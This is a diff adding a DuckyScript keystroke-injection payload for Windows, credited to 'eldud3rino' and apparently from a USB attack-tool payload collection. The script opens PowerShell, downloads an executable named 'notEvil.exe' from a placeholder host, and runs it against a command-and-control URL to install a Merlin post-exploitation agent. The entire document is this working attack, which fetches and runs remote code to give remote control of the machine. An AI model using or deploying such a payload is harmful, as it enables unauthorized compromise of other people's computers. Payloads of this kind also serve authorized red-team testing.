@@ -1,0 +1,21 @@
+REM Title: Merlin Agent downloaded
+REM Author: eldud3rino
+REM Description: Downloads a merlin agent with Invoke-WebRequest and executes it
+REM Target: Windows 
+REM Category: Execute
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+STRING cd C:\temp
+ENTER
+STRING wget http://x.x.x.x:8443/notEvil.exe -OutFile notEvil.exe
+ENTER
+DELAY 60000
+STRING .\notEvil.exe -url https://x.x.x.x:443/
+ENTER
+DELAY 1000
+STRING exit
+ENTER
